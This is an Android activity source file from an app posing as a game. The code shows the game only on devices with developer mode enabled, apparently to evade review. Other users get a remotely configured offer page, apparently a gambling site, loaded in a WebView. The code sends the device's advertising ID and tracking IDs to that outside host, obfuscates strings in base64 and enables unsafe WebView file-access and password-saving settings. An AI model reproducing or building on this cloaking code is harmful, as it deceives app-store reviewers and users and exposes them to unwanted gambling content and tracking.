package com.etgpy.rsiech;

import static com.etgpy.rsiech.ApplicationClass.AFId;
import static com.etgpy.rsiech.ApplicationClass.afLoaded;
import static com.etgpy.rsiech.F_B_K.strDeepetgpy;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;



import java.io.IOException;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class ER extends AppCompatActivity {
    private WebView webViewetgpy;
    private String linketgpy;
    private Uri[] resultsetgpy;
    private ValueCallback<Uri[]> myFilePathCallbacketgpy;
    private SharedPreferences sPrefsetgpy;
    private String keyDefaultetgpy;
    private String offeretgpy;
    private String fbIdetgpy;
    public static final String URLPRFSetgpy = "TEFTVF9XZWJWaWV3X1VSTA==";
    public static final int INPUT_FILE_REQUEST_CODEetgpy = 1;
    public static String statusAppsFlyeretgpy;
    public static String strAppsFlyeretgpy;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ProgressBar progressBar = (ProgressBar) findViewById(R.id.progressBar);
        progressBar.setVisibility(ProgressBar.VISIBLE);

        if ( ! ifDevMode()) {    // TODO delete !

            webViewetgpy = findViewById(R.id.webView);
            setWebViewetgpy(webViewetgpy);

            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl(CNSTN.DB_6_E_47_RAW_EGYPT_RICHES)
                    .build();
            GistApi gistApi = retrofit.create(GistApi.class);
            Call<ResponseBody> gistQuery = gistApi.getStringUrl();
            gistQuery.enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                    if (response.isSuccessful()) {
                        try {
                            String url = response.body().string();
                            String[] params = url.split("\\|");
                            offeretgpy = params[0];
                            keyDefaultetgpy = params[1];
                            fbIdetgpy = params[2];
                            Log.i("MyApp", "gistString = " + url);

                            new F_B_K(fbIdetgpy, ER.this);

                            sPrefsetgpy = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                            linketgpy = sPrefsetgpy.getString(URLPRFSetgpy, null);

                            // TODO uncomment

                            Log.i("MyApp", "linketgpy " + linketgpy);

                            if (linketgpy != null) {
                                webViewetgpy.loadUrl(linketgpy);
                            progressBar.setVisibility(ProgressBar.INVISIBLE);
                            } else {
                                do {
                                } while (!afLoaded);
                                startWebView(offeretgpy);
                                progressBar.setVisibility(ProgressBar.INVISIBLE);
                            }


                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else {
                        Log.i("MyApp", "fail Gist request");
                    }
                }

                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {
                    Log.i("MyApp", "Network Error :: " + t.getLocalizedMessage());
                }
            });

        } else {
            goToGame();
        }
    }


    private void goToGame() {
        Intent intent = new Intent(this, GameActivity.class);
        startActivity(intent);
        finish();
    }

    void startWebView(String link) {

        if (statusAppsFlyeretgpy != null && statusAppsFlyeretgpy.equals("Non-organic")) {
            String url = link + strAppsFlyeretgpy;

            Log.i("MyApp", "Non-organic:" + url);
            webViewetgpy.loadUrl(url);
        } else if (strDeepetgpy != null) {
            String url = link + strDeepetgpy;
            Log.i("MyApp", "DeepLink" + url);
            webViewetgpy.loadUrl(url);
        } else {
            if (keyDefaultetgpy.equals("NO")) {
                //органика выключена
                Log.i("MyApp", "With out naming and deepLinks");
                goToGame();
            } else {
                //органика включена
                strAppsFlyeretgpy =
                        keyDefaultetgpy
                                + CNSTN.decode("P2J1bmRsZT0=") + getPackageName()
                                + CNSTN.decode("JmFkX2lkPQ==") + F_B_K.AIDetgpy
                                + CNSTN.decode("JmFwcHNfaWQ9") + AFId
                                + CNSTN.decode("JmRldl9rZXk9") + CNSTN.decode(CNSTN.LA_ED_RSEVQ_NFJGUERDYW);
                String url = link + strAppsFlyeretgpy;
                Log.i("MyApp", "Organic:" + url);
                //E/User: Organic: https://gigaspin.xyz/Gp88Vp?bundle=com.fferss.fullapp&ad_id=590ec99f-f3df-4f93-9bd9-07e82d8f79e4&apps_id=1641395442394-6992958082334891642&dev_key=jhmwSMVcuZWmhQ3nVyj5S4
                webViewetgpy.loadUrl(url);
            }
        }
    }


    @Override
    public void onBackPressed() {
        webViewetgpy.goBack();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != INPUT_FILE_REQUEST_CODEetgpy || myFilePathCallbacketgpy == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        if (resultCode == Activity.RESULT_OK) {
            String dataString = data.getDataString();
            if (dataString != null) {
                resultsetgpy = new Uri[]{Uri.parse(dataString)};
                myFilePathCallbacketgpy.onReceiveValue(resultsetgpy);
                myFilePathCallbacketgpy = null;
            }
        }
    }

    private boolean ifDevMode() {
        int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        if (devInt == 0) return false;
        return true;
    }


    class MyWebChromeClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback,
                                         FileChooserParams fileChooserParams) {
            myFilePathCallbacketgpy = filePathCallback;
            Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
            contentSelectionIntent.setType(CNSTN.decode("aW1hZ2UvKg=="));
            Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODEetgpy);
            return true;
        }
    }

    class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            webViewetgpy.setVisibility(View.VISIBLE);
            if (url.contains(CNSTN.decode("NDA0"))) {
                goToGame();
                finish();
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            SharedPreferences.Editor editor = sPrefsetgpy.edit();
            editor.putString(URLPRFSetgpy, url);
            editor.apply();
            Log.i("MyApp", "url:" + url);


        }
    }

    private void setWebViewetgpy(WebView webViewetgpy) {
        webViewetgpy.getSettings().setJavaScriptEnabled(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccessFromFileURLs(true);
        webViewetgpy.getSettings().setSaveFormData(true);
        webViewetgpy.getSettings().setMixedContentMode(0);
        webViewetgpy.getSettings().setSavePassword(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setLoadsImagesAutomatically(true);
        webViewetgpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webViewetgpy.getSettings().setDatabaseEnabled(true);
        webViewetgpy.getSettings().setLoadWithOverviewMode(true);
        webViewetgpy.getSettings().setUseWideViewPort(true);
        webViewetgpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webViewetgpy.getSettings().setEnableSmoothTransition(true);
        webViewetgpy.setWebChromeClient(new MyWebChromeClient());
        webViewetgpy.setWebViewClient(new MyWebViewClient());
    }
}






